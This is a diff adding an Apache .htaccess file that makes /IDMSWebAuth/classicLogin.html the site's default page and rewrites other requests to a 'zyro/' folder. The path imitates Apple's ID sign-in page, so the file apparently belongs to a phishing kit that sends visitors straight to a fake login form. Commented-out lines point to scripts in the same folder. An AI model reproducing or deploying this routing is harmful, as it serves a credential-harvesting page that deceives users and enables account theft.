@@ -1,0 +1,17 @@
+# Do not remove this line or mod_rewrite rules and search engine friendly URLs will stop working
+RewriteBase /
+DirectoryIndex /IDMSWebAuth/classicLogin.html
+#DirectoryIndex /IDMSWebAuth/
+#DirectoryIndex classicLogin.html
+#DirectoryIndex /IDMSWebAuth/activation.js
+#DirectoryIndex /IDMSWebAuth/jquery_gsx.js
+
+
+ErrorDocument 401 "Unauthorized"
+ErrorDocument 403 "Forbidden"
+RewriteEngine On
+#### PERSISTENT CONTENT ####
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ zyro/$1 [L,QSA]
+
